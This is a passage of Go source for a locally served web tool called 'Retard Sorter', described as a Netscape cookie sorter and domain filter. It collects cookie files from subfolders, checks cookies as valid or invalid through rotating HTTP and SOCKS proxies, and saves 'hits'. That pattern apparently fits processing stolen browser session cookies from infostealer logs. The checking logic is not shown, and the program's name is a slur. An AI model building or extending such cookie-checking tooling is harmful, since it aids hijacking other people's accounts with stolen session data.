	resRunDir := filepath.Join(resDir, "run_"+timestamp)
	resHitsDir := filepath.Join(resRunDir, "hits")
	os.MkdirAll(resRunDir, 0755)
	os.MkdirAll(resHitsDir, 0755)
	os.MkdirAll(tmpDir, 0755)
	hitsDir := resHitsDir

	processDir := dir
	if hasCookieSubdirs(dir) {
		safeSSEWithContext(r.Context(), w, flusher, ProgressEvent{Type: "progress", Processed: 0, Total: 0, Hits: 0, Percent: 0, CheckStatus: "collecting cookie files from subfolders..."})
		collected, err := collectCookieFiles(dir, tmpDir)
		if err != nil {
			writeSSE(w, ProgressEvent{Type: "error", Message: fmt.Sprintf("failed to collect cookie files: %v", err)})
			return
		}
		if collected == 0 {
			writeSSE(w, ProgressEvent{Type: "error", Message: "no cookie .txt files found in cookie/ subfolders"})
			os.RemoveAll(tmpDir)
			return
		}
		appLog("COLLECTED %d cookie files from subfolders into temp dir", collected)
		processDir = tmpDir
	}

	summary, ok := processFileLoop(r.Context(), w, flusher, filters, processDir, hitsDir, timestamp, proxyMode, proxyFile)
	os.RemoveAll(tmpDir)

	if !ok {
		if r.Context().Err() != nil {
			appLog("RUN CANCELLED - client disconnected")
			return
		}
		writeSSE(w, ProgressEvent{Type: "error", Message: "no files to process"})
		return
	}

	sumData, _ := json.MarshalIndent(summary, "", "  ")
	os.WriteFile(filepath.Join(resRunDir, "summary.json"), sumData, 0644)
	os.WriteFile(filepath.Join(profilesRunDir, "summary.json"), sumData, 0644)

	appLog("RUN COMPLETE - files: %d, cookies: %d, hits: %d, errors: %d, time: %.1fs",
		summary.FilesScanned, summary.TotalCookies, summary.TotalHits, summary.Errors, summary.ElapsedSeconds)

	cfgMu.Lock()
	cfg.LastRun = summary.RunID
	saveConfig(cfg)
	cfgMu.Unlock()

	if r.Context().Err() != nil {
		appLog("SSE SKIP - client disconnected before completion")
		return
	}

	safeSSE(w, flusher, ProgressEvent{
		Type:            "complete",
		RunID:           summary.RunID,
		FilesScanned:    summary.FilesScanned,
		TotalCookies:    summary.TotalCookies,
		TotalHits:       summary.TotalHits,
		Checked:         summary.CheckedCookies,
		Valid:           summary.ValidCookies,
		Invalid:         summary.InvalidCookies,
		Errors:          summary.Errors,
		ElapsedSeconds:  summary.ElapsedSeconds,
		OutputDir:       summary.OutputDir,
		DomainBreakdown: summary.DomainBreakdown,
	})
}

func handleProxyConfig(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		var req struct {
			ProxyMode string `json:"proxy_mode"`
			ProxyFile string `json:"proxy_file"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "invalid JSON", 400)
			return
		}
		switch req.ProxyMode {
		case "", "off", "http", "socks4", "socks5":
		default:
			http.Error(w, "invalid proxy mode", 400)
			return
		}
		if req.ProxyMode == "" {
			req.ProxyMode = "off"
		}
		cfgMu.Lock()
		cfg.ProxyMode = req.ProxyMode
		cfg.ProxyFile = req.ProxyFile
		if req.ProxyMode != "off" && req.ProxyFile != "" {
			loadProxies(req.ProxyFile)
		}
		saveConfig(cfg)
		cfgMu.Unlock()
		writeJSON(w, map[string]string{"status": "ok"})
		return
	}
	handleConfig(w, r)
}

// === USER HANDLER ===

var userMu sync.Mutex

type UserData struct {
	Name string `json:"name"`
}

func userFilePath() string {
	return filepath.Join(profilesDir, "user.json")
}

func loadUser() UserData {
	userMu.Lock()
	defer userMu.Unlock()
	data, err := os.ReadFile(userFilePath())
	if err == nil {
		var u UserData
		if json.Unmarshal(data, &u) == nil {
			return u
		}
	}
	return UserData{}
}

func saveUser(u UserData) {
	userMu.Lock()
	defer userMu.Unlock()
	data, _ := json.MarshalIndent(u, "", "  ")
	os.MkdirAll(profilesDir, 0755)
	os.WriteFile(userFilePath(), data, 0644)
}

func handleUser(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		var req struct {
			Name string `json:"name"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "invalid JSON", 400)
			return
		}
		req.Name = strings.TrimSpace(req.Name)
		if req.Name == "" {
			http.Error(w, "name required", 400)
			return
		}
		saveUser(UserData{Name: req.Name})
		writeJSON(w, map[string]string{"status": "ok", "name": req.Name})
		return
	}
	u := loadUser()
	writeJSON(w, u)
}

// === HELPERS ===

func writeJSON(w http.ResponseWriter, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(v)
}

func writeSSE(w http.ResponseWriter, ev ProgressEvent) {
	defer func() { recover() }()
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	fmt.Fprintf(w, "data: %s\n\n", mustJSON(ev))
	if f, ok := w.(http.Flusher); ok {
		f.Flush()
	}
}

func mustJSON(v interface{}) string {
	data, _ := json.Marshal(v)
	return string(data)
}

func openBrowser(url string) {
	var cmd string
	var args []string
	switch runtime.GOOS {
	case "darwin":
		cmd = "open"
	case "linux":
		cmd = "xdg-open"
	default:
		cmd = "cmd"
		args = []string{"/c", "start"}
	}
	os.StartProcess(cmd, append(args, url), &os.ProcAttr{Files: []*os.File{nil, nil, nil}})
}

func main() {
	defer func() {
		if r := recover(); r != nil {
			appLog("PANIC: %v", r)
			os.Exit(1)
		}
	}()

	cfg = loadConfig()
	appLog("STARTUP - Retard Sorter v%s", Version)
	appLog("Profiles dir: %s", profilesDir)
	appLog("Log file: %s", logPath)

	sub, err := fs.Sub(staticFiles, "static")
	if err != nil {
		appLog("FATAL: static embed failed: %v", err)
		panic(err)
	}

	mux := http.NewServeMux()
	mux.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.FS(sub))))
	mux.Handle("/assets/", http.StripPrefix("/assets/",
		http.FileServer(http.Dir(assetsDir))))
	mux.HandleFunc("/api/changelog", handleChangelog)
	mux.HandleFunc("/api/config", handleConfig)
	mux.HandleFunc("/api/config/filters", handleUpdateFilters)
	mux.HandleFunc("/api/config/proxy", handleProxyConfig)
	mux.HandleFunc("/api/user", handleUser)
	mux.HandleFunc("/api/runs", handleRuns)
	mux.HandleFunc("/api/run/progress", handleRunProgress)
	mux.HandleFunc("/api/runs/", func(w http.ResponseWriter, r *http.Request) {
		path := strings.TrimPrefix(r.URL.Path, "/api/runs/")
		if path == "" {
			handleRuns(w, r)
			return
		}
		handleRunDetail(w, r, path)
	})
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			http.NotFound(w, r)
			return
		}
		data, _ := staticFiles.ReadFile("static/index.html")
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write(data)
	})

	port := "9734"
	addr := "127.0.0.1:" + port
	fmt.Println("============================================================")
	fmt.Println("  RETARD SORTER v" + Version)
	fmt.Println("  Netscape Cookie Sorter & Domain Filter")
	fmt.Println("============================================================")
	fmt.Println()
	fmt.Printf("  Profiles dir: %s\n", profilesDir)
	fmt.Println()
	fmt.Printf("  Place your files in: %s\n", assetsDir)
	fmt.Println("    - background.mp4  (fullscreen video background)")
	fmt.Println("    - logo.gif        (sidebar logo, animated)")
	fmt.Println("    - logo.png        (fallback if logo.gif missing)")
	fmt.Println()
	fmt.Printf("  Server started at  http://%s\n", addr)
	fmt.Println("  Opening browser...")
	fmt.Println()
	fmt.Println("  Press Ctrl+C to stop the server.")
	fmt.Println()
	fmt.Printf("  Log: %s\n\n", logPath)

	go openBrowser("http://" + addr)

	if err := http.ListenAndServe(addr, mux); err != nil {
		appLog("SERVER STOP - %v", err)
		fmt.Fprintf(os.Stderr, "Server error: %s\n", err)
		os.Exit(1)
	}
	appLog("SHUTDOWN - Normal exit")
}
